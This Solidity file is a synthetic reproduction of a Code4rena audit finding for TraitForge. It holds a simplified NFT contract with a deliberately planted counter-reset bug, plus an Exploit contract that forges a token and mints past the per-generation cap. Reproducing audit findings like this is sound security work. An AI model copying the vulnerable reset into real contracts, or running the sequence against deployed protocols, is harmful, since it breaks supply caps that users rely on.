// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
    TraitForge — [H-04] Number of entities in generation can surpass 10k
    (Code4rena 2024-07-traitforge, finding #37918, inzinko).

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.  A forged
    entity is assigned to the next generation before that generation is
    active.  When the current generation later reaches its cap,
    _incrementGeneration resets the next generation's counter to zero.  The
    forged entity is therefore absent from accounting and the active
    generation can contain maxTokensPerGen + 1 entities.

    The real protocol uses 10,000 entities per generation.  This reduction
    uses three slots so the complete sequence is cheap to replay; the
    accounting transition is identical.
*/

contract TraitForgeNft {
    uint256 public currentGeneration = 1;
    uint256 public maxTokensPerGen = 3;
    uint256 public totalMinted;

    mapping(uint256 => uint256) public generationMintCounts;
    mapping(uint256 => uint256) public generationEntityCounts;
    mapping(uint256 => uint256) public tokenGeneration;

    function mintToken() external returns (uint256 tokenId) {
        tokenId = ++totalMinted;
        tokenGeneration[tokenId] = currentGeneration;
        generationEntityCounts[currentGeneration]++;
        generationMintCounts[currentGeneration]++;

        if (generationMintCounts[currentGeneration] >= maxTokensPerGen) {
            _incrementGeneration();
        }
    }

    /// @notice Simplified forging path: the forged entity belongs to the
    ///         generation that is about to become active, and is counted
    ///         before that generation's mint counter is initialized.
    function forge() external returns (uint256 tokenId) {
        uint256 forgedGeneration = currentGeneration + 1;
        tokenId = ++totalMinted;
        tokenGeneration[tokenId] = forgedGeneration;
        generationEntityCounts[forgedGeneration]++;
        generationMintCounts[forgedGeneration]++;
    }

    function _incrementGeneration() private {
        require(
            generationMintCounts[currentGeneration] >= maxTokensPerGen,
            'Generation limit not yet reached'
        );
        currentGeneration++;
        generationMintCounts[currentGeneration] = 0; // @> VULN: resets pre-forged entities from the next generation
        // FIX: preserve the existing count (or account for forged entities)
        // instead of resetting generationMintCounts[currentGeneration].
    }
}

contract Exploit {
    TraitForgeNft public nft; // CREATE nonce 1
    uint256 public forgedToken;

    constructor() {
        nft = new TraitForgeNft();
    }

    function run() external {
        // Forge while generation 1 is active.  The token is already a
        // generation-2 entity, so the pre-increment count is one.
        forgedToken = nft.forge();
        require(nft.tokenGeneration(forgedToken) == 2, 'forge did not target next generation');
        require(nft.generationMintCounts(2) == 1, 'pre-forged count missing');

        // Fill generation 1.  The rollover executes the blamed reset and
        // erases the forged generation-2 count.
        nft.mintToken();
        nft.mintToken();
        nft.mintToken();
        require(nft.currentGeneration() == 2, 'generation did not roll over');
        require(nft.generationMintCounts(2) == 0, 'counter was not reset');

        // Three ordinary mints are now accepted in generation 2 even though
        // one entity was already forged there.  The actual entity count is
        // maxTokensPerGen + 1, violating the per-generation cap.
        nft.mintToken();
        nft.mintToken();
        nft.mintToken();

        require(nft.generationEntityCounts(2) == 4, 'forged entity not over cap');
        require(nft.generationEntityCounts(2) > nft.maxTokensPerGen(), 'cap bypass not demonstrated');
        require(nft.tokenGeneration(forgedToken) == 2, 'forged token generation changed');
    }
}
